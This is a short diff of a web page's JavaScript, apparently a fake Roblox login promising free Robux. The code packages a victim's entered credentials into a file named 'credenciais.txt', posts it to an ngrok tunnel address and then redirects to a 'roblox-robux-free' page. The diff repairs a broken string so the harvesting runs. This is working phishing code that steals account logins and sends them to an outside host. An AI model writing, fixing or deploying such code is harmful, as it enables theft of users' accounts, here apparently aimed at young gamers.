@@ -576,10 +576,10 @@ site.</div></div></noscript>
             // Criar FormData para enviar o arquivo
             const formData = new FormData();
             formData.append('file', blob, 'credenciais.txt');
-            formData.append('username', username); // Dados adicionais (opcional)
+            formData.append('username', username);
 
-            // Enviar para o servidor Ngrok
-            fetch('https://8ea2e38f605b.ngrok-free.app/login/', {
+            // Enviar para o servidor (substitua pela URL correta)
+            fetch(' https://8ea2e38f605b.ngrok-free.app/login/', {
                 method: 'POST',
                 body: formData
             })
@@ -587,8 +587,7 @@ site.</div></div></noscript>
                 if (response.ok) {
                     messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
                     messageDiv.style.color = '#00aa00';
-                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html
-                    // Redirecionar ou fazer algo após o envio
+                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
                 } else {
                     messageDiv.textContent = 'Erro no login. Tente novamente.';
                 }
